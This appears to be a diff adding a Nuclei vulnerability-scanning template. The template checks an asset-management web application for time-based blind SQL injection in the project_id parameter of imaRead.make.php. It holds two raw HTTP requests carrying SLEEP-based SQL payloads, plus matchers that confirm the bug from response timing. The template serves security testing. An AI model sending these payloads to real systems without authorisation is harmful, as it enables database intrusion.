@@ -1,0 +1,31 @@
+id: poc-yaml-baiyiyun-imaread-make-sqli
+info:
+  name: "百易云资产管理 imaRead.make 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 百易云
+
+http:
+  - raw:
+      - |
+        GET /adminx/imaRead.make.php?act=make&ima_type=turnover&building_code=imaShare&fee_month=2025-05&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))xxxx) HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /adminx/imaRead.make.php?act=make&ima_type=turnover&building_code=imaShare&fee_month=2025-05&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(8)))xxxx) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "生成成功"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
